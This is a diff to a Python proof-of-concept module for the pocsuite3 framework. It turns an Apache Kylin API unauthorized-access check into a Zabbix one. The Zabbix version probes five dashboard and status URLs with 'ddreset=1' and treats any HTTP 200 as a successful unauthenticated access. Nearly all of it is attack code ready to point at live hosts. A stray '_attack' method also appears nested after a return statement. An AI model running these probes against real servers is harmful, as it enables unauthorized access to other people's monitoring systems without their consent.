@@ -16,19 +16,19 @@ from pocsuite3.api import OptString
 
 
 class DemoPOC(POCBase):
-    vulID = '8'  # ssvid
+    vulID = '9'  # ssvid
     version = '1.0'
     author = ['charis']
     vulDate = '未知'
-    createDate = '2023-01-06'
-    updateDate = '2023-01-06'
-    references = ['https://help.aliyun.com/noticelist/articleid/1060733129.html']
-    name = 'Apache Kylin API未授权访问漏洞'
-    appPowerLink = 'http://www.thinkphp.cn/'
-    appName = 'Apache Kylin'
-    appVersion = 'Kylin 2.x.x Kylin <= 3.1.0 Kylin 4.0.0-alpha'
+    createDate = '2023-01-16'
+    updateDate = '2023-01-16'
+    references = ['https://www.cnblogs.com/qtzd/p/14971749.html']
+    name = 'Zabbix 未授权访问漏洞'
+    appPowerLink = 'https://www.zabbix.com/'
+    appName = 'Zabbix'
+    appVersion = 'Zabbix <= 4.4'
     vulType = VUL_TYPE.UNAUTHORIZED_ACCESS
-    desc = '''Apache Kylin™是一个开源的、分布式的分析型数据仓库。近日Apache Kylin官方修复 CVE-2020-13937 API未授权访问漏洞。攻击者可构造恶意请求，访问API地址，可以获取Apache Kylin的相关配置信息，从而导致身份凭证等信息泄漏。阿里云应急响应中心提醒 Apache Kylin 用户尽快采取安全措施阻止漏洞攻击'''
+    desc = '''zabbix是一款服务器监控软件，默认服务开放端口为10051，其由server、agent、web等模块组成，其中web模块由PHP编写，用来显示数据库中的结果。'''
     samples = []
     category = POC_CATEGORY.EXPLOITS.WEBAPP
 
@@ -36,7 +36,11 @@ class DemoPOC(POCBase):
     def _check(self, url):
 
         payloads = [
-            r"/submit",
+            r"/zabbix.php?action=dashboard.view&ddreset=1",
+            r"/zabbix.php?action=problem.view&ddreset=1",
+            r"/overview.php?ddreset=1",
+            r"/srv_status.php?ddreset=1",
+            r"/latest.php?ddreset=1"
         ]
 
         for payload in payloads:
@@ -53,11 +57,7 @@ class DemoPOC(POCBase):
             try:
                 r = requests.get(vul_url, headers=headers)
                 if r.status_code == 200:
-                    info = ""
-                    dict = json.loads(r.text)
-                    for key, value in dict.items():
-                        info += "" + str(key) + "=" + str(value) + "\n\t\t"
-                    return url, payload, info
+                    return url, payload, url + payload
 
             except requests.exceptions.RequestException as e:
                 pass
@@ -71,7 +71,7 @@ class DemoPOC(POCBase):
             result['VerifyInfo'] = {}
             result['VerifyInfo']['URL'] = p[0]
             result['VerifyInfo']['payload'] = p[1]
-            result['VerifyInfo']['Console data'] = p[2]
+            result['VerifyInfo']['allurl'] = p[2]
         return self.parse_output(result)
 
         def _attack(self):
